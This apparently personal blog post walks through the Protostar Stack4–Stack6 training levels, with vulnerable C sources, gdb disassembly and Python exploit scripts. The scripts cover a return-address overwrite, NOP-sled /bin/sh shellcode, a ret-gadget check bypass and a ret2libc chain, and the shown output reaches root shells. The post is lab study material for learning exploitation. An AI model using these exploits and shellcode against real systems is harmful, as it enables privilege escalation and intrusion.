---
layout: post
title:  "Protostar Stack4, Stack5, Stack6"
date:   2023-04-6 09:00:00 +1100
categories: Journey
tags: 
---

## Stack 4

Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Basic Output:
```bash
user@protostar:/tmp$ /opt/protostar/bin/stack4
TESTINPUTS
```

Disassembly of win and main functions:
```bash
(gdb) disass win
Dump of assembler code for function win:
0x080483f4 <win+0>:     push   ebp
0x080483f5 <win+1>:     mov    ebp,esp
0x080483f7 <win+3>:     sub    esp,0x18
0x080483fa <win+6>:     mov    DWORD PTR [esp],0x80484e0
0x08048401 <win+13>:    call   0x804832c <puts@plt>
0x08048406 <win+18>:    leave
0x08048407 <win+19>:    ret
End of assembler dump.
(gdb)
```

```bash
(gdb) disass main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.
```

I ran this with input of `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ` and found that `eip` tried to point to `0x54545454` so now we just need to replace `TTTT` with desired address of `0x080483f4`/`\xf4\x83\x04\x08`.

Python to make overflow string:
```python
buffer = "A"*20
taddr = "\xf4\x83\x04\x08"
print buffer + taddr
```

Output of python file:
```bash
user@protostar:/tmp$ cat stack4
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS�
user@protostar:/tmp$
```

Pipe this into the program, and we have our solution:
```bash
user@protostar:/tmp$ python stack4.py | /opt/protostar/bin/stack4
code flow successfully changed
Segmentation fault
```

## Stack5

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

```bash
(gdb) disass main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.
```

Stack flooded with chars:
```
0xbffff7c0:     0x00000000      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x08048232
0xbffff7e0:     0x00000001      0xbffff820      0xb7ff0626      0xb7fffab0
0xbffff7f0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff800:     0xbffff838      0xf5025042      0xdf55a652      0x00000000
0xbffff810:     0x00000000      0x00000000      0x00000001      0x08048310
```

We first pad out the stack where we know that TTTT is where we need the new eip value. We know that we want at least `0xbffff7d0`, however to add tolerance, we pad this by 30, and add a `NOP` slide of 100 long until we hit out payload from `shell-code` which is a 28 byte `/bin/sh` execve shell-code.
```python
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
eip = struct.pack("I", 0xbffff7d0+30)
nop = '\x90'*100
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print padding + eip + nop + payload
```

Running this with cat for an input shell like below, we have access:
```bash
user@protostar:/tmp$ (cat stack5;cat) | /opt/protostar/bin/stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
pwd
/tmp
```


## Stack 6

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

```bash
(gdb) disass main
Dump of assembler code for function main:
0x080484fa <main+0>:    push   ebp
0x080484fb <main+1>:    mov    ebp,esp
0x080484fd <main+3>:    and    esp,0xfffffff0
0x08048500 <main+6>:    call   0x8048484 <getpath>
0x08048505 <main+11>:   mov    esp,ebp
0x08048507 <main+13>:   pop    ebp
0x08048508 <main+14>:   ret
End of assembler dump.
(gdb) disass getpath
Dump of assembler code for function getpath:
0x08048484 <getpath+0>: push   ebp
0x08048485 <getpath+1>: mov    ebp,esp
0x08048487 <getpath+3>: sub    esp,0x68
0x0804848a <getpath+6>: mov    eax,0x80485d0
0x0804848f <getpath+11>:        mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:        call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:        mov    eax,ds:0x8049720
0x0804849c <getpath+24>:        mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:        call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
0x080484af <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:        and    eax,0xbf000000
0x080484bd <getpath+57>:        cmp    eax,0xbf000000
0x080484c2 <getpath+62>:        jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:        mov    eax,0x80485e4
0x080484c9 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:        mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:        call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:        call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:        mov    eax,0x80485f0
0x080484e9 <getpath+101>:       lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:       mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:       call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:       leave
0x080484f9 <getpath+117>:       ret
End of assembler dump.
```

```python
buffer = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
ret    = "\x00\x00\x00\xbf"
print buffer + ret
```

```bash
user@protostar:/tmp$ python stack6.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT�
user@protostar:/tmp$ python stack6.py | /opt/protostar/bin/stack6
input path please: bzzzt (0xbf000000)
```

Modified to return to the return address itself bypassing the `0xbf000000` check and added padding for extra size required `0000`
```python
import struct
padding = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
eip = struct.pack("I", 0xbffff7d0+30)
ret = struct.pack("I", 0x080484f9)
nop = '\x90'*100
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print padding + ret + eip + nop + payload
```

With this, the exploit executes:
```
user@protostar:/tmp$ (python stack6.py;cat) | /opt/protostar/bin/stack6
input path please: got path 0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO��QQQQRRRRSSSS����������������������������������������������������������������������������������������������������������1�Ph//shh/bin����°
                                                                                                  ̀1�@̀
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
pwd
/tmp
```

Another Solution - lib2c /bin/sh:
```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
```

We have lib2c loaded into the program:
```bash
0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
```

Here we also have `/bin/sh` as an available system call:
```
user@protostar:/tmp$ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
 11f3bf /bin/sh
```

We add the offset in the file onto the location of lib2c in the program for the real location of `/bin/sh`
```
0xb7e97000 + 11f3bf = 0xb7fb63bf
```

We pack the stack so that we can change the return address to libc, and pack some data in there so we can then return to `/bin/sh`
```python
#lib2c.py
import struct
padding = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
libc    = struct.pack("I", 0xb7ecffb0)
pack    = "AAAA"
binsh   = struct.pack("I", 0xb7fb63bf)

print padding + libc + pack + binsh
```

Now we have console!
```bash
user@protostar:/tmp$ (python lib2c.py;cat)|/opt/protostar/bin/stack6
input path please: got path 0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO���QQQQRRRRSSSS���AAAA�c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
pwd
/tmp
```